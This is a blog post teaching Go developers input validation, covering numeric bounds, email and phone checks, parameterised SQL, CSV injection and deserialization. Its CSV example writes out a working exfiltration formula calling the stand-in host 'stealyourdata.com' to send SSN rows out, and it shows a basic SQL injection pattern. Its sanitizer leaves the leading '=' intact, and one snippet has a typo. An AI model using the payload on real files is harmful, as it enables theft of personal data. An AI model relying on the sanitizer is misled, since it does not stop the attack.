---
title: "Input validation for the security-minded developer"
date: 2024-05-03T11:48:16-04:00
tags: ["go", "security", "application security"]
categories: ["go", "security", "application security"]
---
If you spent any time developing web applications you've come across a need to validate input, whether it be on forms or API endpoints. In an ideal world, we'd only deal with trusted users with good intentions and completely close off any interactions with untrusted users. But the reality is that most applications need to deal with input, and we can't always guarantee that it's coming from a trusted source or that a malicious threat actor isn't sitting in between the connection. So validating said input is a first line of defense from being compromised. Whether the threat is a data leak, arbitrary code execution, state manipulation, or simply causing the program to act in a way it was not designed to.

We first need to start with a base understanding of who or what our threats are, what inputs are we exposing and to whom, and how they impact the system. For instance, any type of input that is exposed to unauthorized users must be treated with more rigor than inputs that should only ever be exposed to authenticated users. Even then, it's a good idea to consider validation at a reasonable level to ensure the data we're receiving is what's expected.

A good strategy is to come up with a whitelist (allowlist) and let that guide the constraints. It's much easier to keep track of what a system SHOULD accept than to come up with every possibility of what it SHOULDN'T.

### Environments

A security check is only as secure as its environment. For instance, it's not enough to add validation via something like an HTML attribute `<input type="email" maxlength=32 required/>` if we know that it wouldn't take much for a user to open their browser's dev tools and alter the attributes to bypass the checks. Similarly, we can't just rely on the JavaScript powering the web app since it too runs on the browser. This is not to say we shouldn't bother doing any input validation on the client, rather it's a reminder that we need to be critical of what we deem valid at each major component of a system. Similarly, on the server, we need to evaluate the trust boundaries. If you're integrating with a third-party API, what is the likelihood of someone sitting in between and altering the data? What if they change their API, are you gracefully handling an unexpected response? They're also not immune to attacks so consider carefully how the data coming from that external API is handled.

There's always a trade-off, the more checks and branches you add to a system the higher its complexity, which means more code others, hopefully, need to understand and more code that needs to be maintained. So the idea is not to go overboard. Evaluate who your users are, what threat actors you're likely to encounter, where your zones of trust start and end, and make whatever trade-offs you deem worth making. It's also not a one and done task, every now and then it's a good idea to monitor your system and if you notice a trend in certain attack vectors you hadn't secured as much before you can re-evaluate and implement whatever is necessary to further secure the system.

### Numbers

Numbers are values we deal with every day, from entering the quantity of an item we wish to purchase to Social Security Numbers when filing out a verification forms on financial institution websites. So it's important to consider what we're trying to validate, outside of it being a numeric value in the first place.

In its most basic form, we want to ensure that the number we're accepting is within bounds (min/max) of the data type. For instance, min checks, e.g. numbers cannot be less than 0 or 1, it wouldn't make much sense to add an item to a cart with a quantity of 0. It's just as important for max, for instance when dealing with Bitcoin data some fields will simply not fit in a standard Postgres `integer` type and require the use of `bigint` instead; this can become an issue when accepting values via an unbounded data type like Python's `int` (in stricter terms, the bound is tied to memory which can differ depending on what system the program is being run on). You may have an API integration accepting Bitcoin data and if the field is not properly checked it could result in an error when trying to insert into the wrong Postgres field.

Where possible, leverage a language type system to help enforce validity if possible. For example, if you know you can only ever have numbers between 0 and 255 then you can leverage this requirement in Go by using an unsigned integer type:

```go
var smallUnsignedNumber uint8
// smallUnsignedNumber = 100 Valid
// smallUnsignedNumber = 256 Invalid/Overflows
// smallUnsignedNumber = -1 Invalid/Overflows
```

### Text

Probably one of the widest categories in the sense that text can be a simple (y)es or (n)o prompt, description, favorite color, alphanumeric serial number, name, address, password, etc. So I'd like to start by saying that in a general sense, there are a few basic checks we should apply but I'd recommend getting more specific

* Is the text coming from the untrusted source in the correct encoding (e.g. UTF-8)?
* Is the text length within bounds (min/max length)?

From here you could apply further checks as needed and as you will see below there are special types of text that can be validated against a well-known standard.

While it may seem trivial to throw in a simple regex to validate an email address `/^\S+@\S+$/` it's often not enough (`user@~@example.com` is technically a match) and you can iterate on this but at a certain point, it's a good idea to delegate this check if possible as well as test whether the address is reachable if required. For instance, you could use Golang's net/mail parser to check if an email is parsed as defined in RFC5322:

```go
package main

import (
 "log"
 "net/mail"
)

func main() {
 e, err := mail.ParseAddress("Felipe <felipe@example.com>")
 if err != nil {
  log.Fatal(err)
 }
}
```

Similarly with HTML, although it would be a really good idea to go further and sanitize the input (we wouldn't an XSS slipping through the cracks)

```go
package main

import (
 "log"
 "strings"

 "golang.org/x/net/html"
)

func main() {
 s := `<p>Resources:</p><ul><li><a href="foo">Go doc's</a><li><a href="/bar/baz">Tour of Go</a></ul>`
 doc, err := html.Parse(strings.NewReader(s))
 if err != nil {
    log.Falal(err)
  }
```

And we can extend this to dates, street addresses, coordinates, phone numbers, etc. As a counter to the above suggestion, if the standard is simple to verify and we can safely conjure a regular expression to avoid adding more and more external dependencies we should use regex. For instance, phone numbers, specifically if we know we are only working with E.164 numbers you could simply run a match:

```go
package main

import (
 "fmt"
 "log"
 "regexp"
)

func main() {
 p := "+14155552671"
 // E.164 valid number
 r, err := regexp.Compile("^\\+[1-9]\\d{1,14}$")
 if err != nil {
  log.Fatal(err)
 }
 fmt.Printf("is valid E.164 phone number: %v", r.MatchString(p))
}

```

### SQL injection

Yes, injections are still a thing. Just take a look at the [OWASP TOP 10](https://owasp.org/Top10/A03_2021-Injection/). So it pays to implement some common sense preventative measures like using a trusted ORM to help safely handle input for you. In the case of Go, the standard libs database/sql is designed with paramertization in mind and is also handled implicitly when running Query without the need of an ORM:

```go
import (
 "database/sql"

 _ "github.com/lib/pq"
)

func main() {
...
    db, err := sql.Open("postgres", cfg.Database.DSN)
    if err != nil {
        log.Fatal(err)
    }

...
var user User
var r UserNameRequest
err := json.NewDecoder(r.Body).Decode(&r)
username := r.username
// at runtime this is created as a prepared statement
rows, err := db.Query("SELECT username FROM users WHERE username = $1", r.username)
// or you can use prepared statement explictly
    stmt, err := repo.DB.Prepare(...)
    if err != nil {
    log.Fatal(err)
    }
    defer stmt.Close()
    err = stmt.QueryRow(r.username).Scan(...)
    if err != nil {
        log.Fatal(err)
    }
...
// Avoid this
rows, err := db.Query(fmt.Sprintf("SELECT * FROM user WHERE username = %s", r.username))
// with the right input you could land on
// SELECT * FROM user WHERE username = 1 OR 1=1;
}
```

### CSV injection

With CSVs just like HTML, there are techniques attackers can use to execute malicious code if it is not safely handled. For example, injecting a function that will open a malicious website and send the csv data over:

```go
package main

import (
 "encoding/csv"
 "fmt"
 "io"
 "log"
 "regexp"
 "strings"
)

func sanitize(s string) string {
 re := regexp.MustCompile(`([=\-\+@])`)
 // If an executable value is found, prepend a space to invalidate it
 return re.ReplaceAllString(s, " $1")
}
func main() {
 // This would inject data from all cells starting from the very next row through to the end of the file! If and when the user clicks on the link, the data would be sent over to the malicious site.
 in := `
first_name,last_name,ssn,dob,username
"John","Doe","000000000","00/00/00","=HYPERLINK(""http://stealyourdata.com?x=""&TEXTJOIN("","",TRUE,INDIRECT(""A"" & ROW() + 1 & "":E"" & ROWS(A:A))), ""Click here for username"")"
`
 r := csv.NewReader(strings.NewReader(in))

 for {
  record, err := r.Read()
  if err == io.EOF {
   break
  }
  if err != nil {
   log.Fatal(err)
  }

  fmt.Printf("Unsanitized: %v\n", record[4])
  fmt.Printf("Sanitized: %v\n", sanitize(record[4]))

 }
}
```

Output

```text
Unsanitized:=HYPERLINK("http://stealyourdata.com?x="&TEXTJOIN(",",TRUE,INDIRECT("A" & ROW() + 1 & ":E" & ROWS(A:A))), "Click here for username")
Sanitized: =HYPERLINK("http://stealyourdata.com?x ="&TEXTJOIN(",",TRUE,INDIRECT("A" & ROW()  + 1 & ":E" & ROWS(A:A))), "Click here for username")
```

So it would be wise to parse and sanitize (either by rolling out your own or using a library) the data to prevent such attacks.

### Insecure deserialization

This goes without saying, but deserializing data from untrusted sources should be handled with care. If not handled properly it can lead to RCE or state manipulation. So we can start by sticking to safer deserialization formats like JSON, ensuring whatever library we're using to deserialize does not allow arbitrary code execution, and using authentication (e.g. cookies, JWT, etc). If you're in control of the client, ensure you properly validate and sanitize any input before it's serialized and sent over the network (This doesn't guarantee tampering but it's one of many safeguards you can implement end-to-end). With this in mind, we can leverage language features like reflection/struct tags and roll out your own validation or use third-party libraries like validator to validate the deserialized data. My goal is to provide a general idea here, how you choose to implement is driven by your requirements and preferences.

```go
type User struct {
  Name string `json:"name" validate:"string,min=2,max=10"`
  Age int`json:"age" validate:"number,gte=0,lte=100"`
  Email string `json:"email" validate:"email,max=32"`
  Password string `json:"-"`
}

func jwtMiddleware(next http.Handler) http.Handler {...}
func validateStruct(s interface {}) error {...}

func handleNewUser(w http.ResponsWriter, r *http.Request) {
  var u User
  if err := json.NewDecoder(r.Body).Decode(&u); err != nil {
    http.Error(w, err.Error(), http.StatusBadRequest)
    return
  }

  if err := validateStruct(u); err != nil {
    http.Error(w, err.Error(), http.StatusBadRequest)
    return
  }
  ...
} 

func main() {
  ...
  mux := http.NewServeMux()
  mux.HandleFunc("POST /users/new", jwtMiddleware(handleNewUser))
  ...
}

```

### Conclusion

While this article is not meant to be exhaustive I hope it provided some insight on the value of input validation. It's fascinating just how much input can be used to exploit in the software we build. Having a better understanding of each type of input and the various techniques that can be used against our expected understanding of them can lead to safer software.
